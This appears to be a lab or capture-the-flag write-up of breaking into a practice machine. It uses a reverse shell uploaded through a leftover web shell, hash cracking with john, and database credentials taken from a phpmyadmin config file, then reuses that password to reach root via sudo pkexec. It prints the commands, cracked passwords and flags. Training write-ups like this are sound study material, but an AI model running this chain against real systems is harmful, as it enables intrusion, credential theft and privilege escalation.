p-80 
- default apache2 page
- /phpmyadmin
- /robots.txt
	- Allow: Enum_this_Box
- /phpmyadmin/js/whitelist.php?
- /mini.php 
	- Some hacker has left mini shell here. I can use this to upload a rev shell most likely.

I upload pentester rev shell and navigate to shell.php which gets me on the machine.

```php
rlwrap nc -nlvp 8443
```

`http://192.168.231.132/shell.php`

stable shell

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I first look for text files in the users home directory but i don't find anything, i then run a scan for SUID files:

```php
find / -perm -u=s  2>/dev/null
```

This reveals pkexec has SUID set, but the user does not have sudo rights.

I find the first flag at:
`cat /var/www/local.txt`
`5188bb02d8ac1a3db4af5989e4324a83`

Linpeas

Sudo version 1.8.21p2 

Check vuln versions of sudo

```php
searchsploit sudo
```

users
`oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash`

- I think that is giving away the password for some reason. Linpeas confirms this later in the scan.

I echo the details into a file for john and crack the password:

```php
echo 'oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash' > hash.txt
```

```php
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Name: oracle
Pass: hiphop        

User does not have sudo access.

I need a user that has sudo privileges, and then i can use pkexec for root.

Possible config files: `"/etc/phpmyadmin/htpasswd.setup"`

```php
cd /etc/phpmyadmin/
```

One file i could access if i was on the www-data account, so i use exit to go back to the first account so i can read the file.
`config-db.php`

db-username: phpmyadmin
db-password: tgbzhnujm!

I try the new password on the other user accounts, and it gives me access to karla who has sudo privileges allowing me to escalate to root with the SUID exploit i found early.

```php
su karla
```
- password: tgbzhnujm!

```php
cd /usr/bin
```

root
```php
sudo pkexec /bin/sh
```

```php
cat /root/proof.txt
```

`cd1a25d60325f0edbd842fb78c486db6`


